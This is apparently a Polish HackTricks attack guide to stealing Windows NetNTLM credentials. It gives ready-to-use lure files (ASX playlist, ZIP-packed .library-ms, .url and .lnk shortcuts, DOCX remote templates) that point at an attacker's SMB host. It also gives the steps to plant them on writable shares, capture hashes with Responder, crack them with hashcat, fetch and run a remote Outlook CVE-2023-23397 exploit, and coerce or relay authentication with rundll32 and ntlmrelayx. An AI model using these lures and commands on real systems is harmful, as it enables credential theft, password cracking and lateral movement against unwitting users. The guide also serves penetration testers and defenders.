# Miejsca, z których można wykraść poświadczenia NTLM

{{#include ../../banners/hacktricks-training.md}}

**Sprawdź wszystkie świetne pomysły z [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/) — od pobrania pliku microsoft word online po źródło ntlm leaks: https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md oraz [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**<sup>[[12]](#references)[[13]](#references)[[14]](#references)</sup>

### Zapisywalny udział SMB + przynęty UNC wyzwalane przez Explorer (ntlm_theft/SCF/LNK/library-ms/desktop.ini)

Jeśli możesz **zapisywać w udziale, który użytkownicy lub zaplanowane zadania przeglądają w Explorerze**, umieść w nim pliki, których metadane wskazują na Twój UNC (np. `\\ATTACKER\share`). Renderowanie zawartości folderu wyzwala **niejawne uwierzytelnianie SMB** i wycieka **NetNTLMv2** do Twojego listenera.<sup>[[1]](#references)</sup>

1. **Wygeneruj przynęty** (obsługuje SCF/URL/LNK/library-ms/desktop.ini/Office/RTF/itp.)
```bash
git clone https://github.com/Greenwolf/ntlm_theft && cd ntlm_theft
uv add --script ntlm_theft.py xlsxwriter
uv run ntlm_theft.py -g all -s <attacker_ip> -f lure
```
2. **Umieść je w udziale z prawem zapisu** (w dowolnym folderze otwieranym przez ofiarę):
```bash
smbclient //victim/share -U 'guest%'
cd transfer\
prompt off
mput lure/*
```
3. **Nasłuchuj i crackuj**:
```bash
sudo responder -I <iface>          # capture NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt  # autodetects mode 5600
```
Windows może jednocześnie przetwarzać kilka plików; wszystko, co Explorer podgląda (`BROWSE TO FOLDER`), nie wymaga żadnych kliknięć.

### Playlisty Windows Media Player (.ASX/.WAX)

Jeśli nakłonisz cel do otwarcia lub podglądu kontrolowanej przez Ciebie playlisty Windows Media Player, możesz wykraść Net‑NTLMv2, wskazując wpis na ścieżkę UNC. WMP spróbuje pobrać wskazany plik multimedialny przez SMB i automatycznie uwierzytelni się.<sup>[[3]](#references)[[4]](#references)</sup>

Przykładowy payload:
```xml
<asx version="3.0">
<title>Leak</title>
<entry>
<title></title>
<ref href="file://ATTACKER_IP\\share\\track.mp3" />
</entry>
</asx>
```
Przepływ zbierania i łamania:
```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```
### ZIP-embedded .library-ms NTLM leak (CVE-2025-24071/24055)

Windows Explorer niebezpiecznie obsługuje pliki .library-ms, gdy są one otwierane bezpośrednio z archiwum ZIP. Jeśli definicja biblioteki wskazuje na zdalną ścieżkę UNC (np. \\attacker\share), samo przeglądanie/uruchomienie pliku .library-ms wewnątrz archiwum ZIP powoduje, że Explorer wylicza zasoby UNC i wysyła uwierzytelnianie NTLM do atakującego. W rezultacie uzyskuje się NetNTLMv2, który można złamać offline lub potencjalnie poddać relay.<sup>[[2]](#references)</sup>

Minimalny plik .library-ms wskazujący na UNC atakującego
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<version>6</version>
<name>Company Documents</name>
<isLibraryPinned>false</isLibraryPinned>
<iconReference>shell32.dll,-235</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<simpleLocation>
<url>\\10.10.14.2\share</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
Kroki operacyjne
- Utwórz plik .library-ms z powyższym XML-em (ustaw swój adres IP/hostname).
- Spakuj go do archiwum ZIP (w Windows: Wyślij do → Folder skompresowany (zip)) i dostarcz ZIP do celu.
- Uruchom listener przechwytujący NTLM i poczekaj, aż ofiara otworzy plik .library-ms wewnątrz archiwum ZIP.


### Ścieżka dźwięku przypomnienia kalendarza Outlook (CVE-2023-23397) – zero-clickowy leak Net-NTLMv2

Microsoft Outlook for Windows przetwarzał rozszerzoną właściwość MAPI PidLidReminderFileParameter w elementach kalendarza. Jeśli ta właściwość wskazywała na ścieżkę UNC (np. \\attacker\share\alert.wav), Outlook łączył się z udziałem SMB w momencie uruchomienia przypomnienia, ujawniając Net-NTLMv2 użytkownika bez konieczności wykonania jakiegokolwiek kliknięcia. Luka została załatana 14 marca 2023 r., ale nadal ma duże znaczenie w przypadku starszych/niezaktualizowanych środowisk oraz historycznej analizy incydentów.<sup>[[5]](#references)</sup>

Szybka eksploatacja za pomocą PowerShell (Outlook COM):
```powershell
# Run on a host with Outlook installed and a configured mailbox
IEX (iwr -UseBasicParsing https://raw.githubusercontent.com/api0cradle/CVE-2023-23397-POC-Powershell/main/CVE-2023-23397.ps1)
Send-CalendarNTLMLeak -recipient user@example.com -remotefilepath "\\10.10.14.2\share\alert.wav" -meetingsubject "Update" -meetingbody "Please accept"
# Variants supported by the PoC include \\host@80\file.wav and \\host@SSL@443\file.wav
```
Po stronie listenera:
```bash
sudo responder -I eth0  # or impacket-smbserver to observe connections
```
Notatki
- Ofiara musi mieć uruchomiony Outlook for Windows tylko w momencie wyzwolenia przypomnienia.
- leak ujawnia Net-NTLMv2, które nadaje się do offline cracking lub relay (nie do pass-the-hash).


### .LNK/.URL icon-based zero-click NTLM leak (CVE‑2025‑50154 – bypass CVE‑2025‑24054)

Windows Explorer automatycznie renderuje ikony skrótów. Najnowsze badania wykazały, że nawet po wydaniu przez Microsoft poprawki z kwietnia 2025 r. dotyczącej skrótów z ikonami UNC nadal można było wywołać uwierzytelnianie NTLM bez żadnych kliknięć, hostując cel skrótu na ścieżce UNC i pozostawiając ikonę lokalnie (bypass poprawki otrzymał oznaczenie CVE‑2025‑50154). Samo wyświetlenie folderu powoduje, że Explorer pobiera metadane ze zdalnego celu, wysyłając NTLM do atakującego SMB server.<sup>[[6]](#references)</sup>

Minimalny payload Internet Shortcut (.url):
```ini
[InternetShortcut]
URL=http://intranet
IconFile=\\10.10.14.2\share\icon.ico
IconIndex=0
```
Payload skrótu programu (.lnk) za pomocą PowerShell:
```powershell
$lnk = "$env:USERPROFILE\Desktop\lab.lnk"
$w = New-Object -ComObject WScript.Shell
$sc = $w.CreateShortcut($lnk)
$sc.TargetPath = "\\10.10.14.2\share\payload.exe"  # remote UNC target
$sc.IconLocation = "C:\\Windows\\System32\\SHELL32.dll" # local icon to bypass UNC-icon checks
$sc.Save()
```
Pomysły na dostarczenie
- Umieść skrót w archiwum ZIP i nakłoń ofiarę do jego otwarcia.
- Umieść skrót w zapisywalnym udziale, który ofiara otworzy.
- Połącz go z innymi plikami-przynętami w tym samym folderze, aby Explorer wyświetlił podgląd elementów.

### No-click .LNK NTLM leak via ExtraData icon path (CVE‑2026‑25185)

Windows ładuje metadane `.lnk` podczas **view/preview** (renderowania ikony), a nie tylko podczas uruchamiania. CVE‑2026‑25185 pokazuje ścieżkę parsowania, w której bloki **ExtraData** powodują, że shell rozwiązuje ścieżkę ikony i uzyskuje dostęp do systemu plików **podczas ładowania**, wysyłając wychodzące uwierzytelnianie NTLM, gdy ścieżka jest zdalna.

Kluczowe warunki wyzwalające (zaobserwowane w `CShellLink::_LoadFromStream`):
- Uwzględnij **DARWIN_PROPS** (`0xa0000006`) w ExtraData (warunek wejścia do procedury aktualizacji ikony).
- Uwzględnij **ICON_ENVIRONMENT_PROPS** (`0xa0000007`) z wypełnionym **TargetUnicode**.
- Loader rozwija zmienne środowiskowe w `TargetUnicode` i wywołuje `PathFileExistsW` dla wynikowej ścieżki.

Jeśli `TargetUnicode` rozwiąże się do ścieżki UNC (np. `\\attacker\share\icon.ico`), **samo wyświetlenie folderu** zawierającego skrót powoduje wysłanie uwierzytelniania. Ta sama ścieżka ładowania może zostać również wywołana przez **indexing** i skanowanie AV, co czyni ją praktyczną powierzchnią no-click leak.<sup>[[7]](#references)</sup>

Narzędzia badawcze (parser/generator/UI) są dostępne w projekcie **LnkMeMaybe** i umożliwiają tworzenie oraz inspekcję tych struktur bez używania Windows GUI.<sup>[[8]](#references)</sup>


### WebDAV auth coercion / credential validation via `davclnt.dll,DavSetCookie`

Natywny **WebDAV client** może zostać wykorzystany do wymuszenia uwierzytelnienia bieżącej sesji logowania do dowolnego endpointu **HTTP/WebDAV**:
```cmd
rundll32.exe davclnt.dll,DavSetCookie <HOST> http://<TARGET>/C$/Windows
```
Dlaczego jest to przydatne:
- Wobec **attacker-controlled WebDAV server** może wywołać **NTLM over HTTP** bez wdrażania niestandardowego klienta.
- Wobec **hostów wewnętrznych** jest to cichy sposób na **zweryfikowanie, gdzie skradzione poświadczenia są akceptowane** przed rozpoczęciem ruchu lateralnego.<sup>[[9]](#references)</sup>
- To polecenie jest dobrą alternatywą, gdy **SMB egress jest filtrowany**, ale **HTTP/WebDAV** jest nadal osiągalny.

Uwagi operacyjne:
- Usługa **WebClient** musi działać na hoście źródłowym.
- `rundll32.exe` ładuje `davclnt.dll` i powoduje, że Windows obsługuje uwierzytelnianie WebDAV przy użyciu **poświadczeń bieżącego użytkownika**.<sup>[[10]](#references)</sup>
- Jeśli kierujesz żądanie do kontrolowanej przez siebie infrastruktury, użyj listenera/relay obsługującego NTLM, takiego jak:
```bash
# Capture or relay NTLM over HTTP/WebDAV
ntlmrelayx.py -t smb://<TARGET> --http-port 80
```
Z perspektywy detekcji powtarzające się wykonania `rundll32.exe davclnt.dll,DavSetCookie` wobec wielu systemów wewnętrznych są silnym sygnałem **credential validation / przygotowania lateral movement w stylu spray**, a nie normalnego zachowania użytkownika.<sup>[[9]](#references)[[11]](#references)</sup>

### Office remote template injection (.docx/.dotm) w celu wymuszenia NTLM

Dokumenty Office mogą odwoływać się do zewnętrznego szablonu. Jeśli ustawisz dołączony szablon na ścieżkę UNC, otwarcie dokumentu spowoduje uwierzytelnienie do SMB.

Minimalne zmiany w relacjach DOCX (wewnątrz word/):

1) Edytuj word/settings.xml i dodaj odwołanie do dołączonego szablonu:
```xml
<w:attachedTemplate r:id="rId1337" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
```
2) Edytuj word/_rels/settings.xml.rels i skieruj rId1337 do swojego UNC:
```xml
<Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\10.10.14.2\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
```
3) Przepakuj do .docx i dostarcz. Uruchom listener przechwytujący SMB i poczekaj na otwarcie.

Pomysły dotyczące działań po przechwyceniu, takich jak relaying lub abuse NTLM, znajdziesz tutaj:

{{#ref}}
README.md
{{#endref}}


## Referencje
- [1] [HTB: Breach – przynęty w postaci writable share + przechwycenie przez Responder → crack NetNTLMv2 → Kerberoast svc_mssql](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [2] [HTB Fluffy – auth leak z ZIP .library‑ms (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 do DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [3] [HTB: Media — leak NTLM przez WMP → junction NTFS do webroot RCE → FullPowers + GodPotato do SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [4] [Morphisec – 5 podatności NTLM: niezałatane zagrożenia eskalacji uprawnień w Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
- [5] [MSRC – Microsoft łagodzi problem Outlook EoP (CVE‑2023‑23397) i wyjaśnia leak NTLM przez PidLidReminderFileParameter](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
- [6] [Cymulate – Zero-click, one NTLM: obejście poprawki bezpieczeństwa Microsoft (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)
- [7] [TrustedSec – LnkMeMaybe: przegląd CVE‑2026‑25185](https://trustedsec.com/blog/lnkmemaybe-a-review-of-cve-2026-25185)
- [8] [Narzędzia TrustedSec LnkMeMaybe](https://github.com/trustedsec/LnkMeMaybe)
- [9] [Rapid7 – Gdy dzwoni IT Support: analiza kampanii ModeloRAT — od Teams do przejęcia domeny](https://www.rapid7.com/blog/post/tr-it-support-dissecting-modelorat-campaign-microsoft-teams-compromise)
- [10] [Microsoft Learn – nagłówek davclnt.h](https://learn.microsoft.com/en-us/windows/win32/api/davclnt/)
- [11] [Splunk – żądanie WebDAV Windows Rundll32](https://research.splunk.com/endpoint/320099b7-7eb1-4153-a2b4-decb53267de2/)
- [12] [osandamalith.com - interesujące miejsca do kradzieży hashy NetNTLM](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes)
- [13] [soufianetahiri/TeamsNTLMLeak](https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md)
- [14] [p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)


{{#include ../../banners/hacktricks-training.md}}
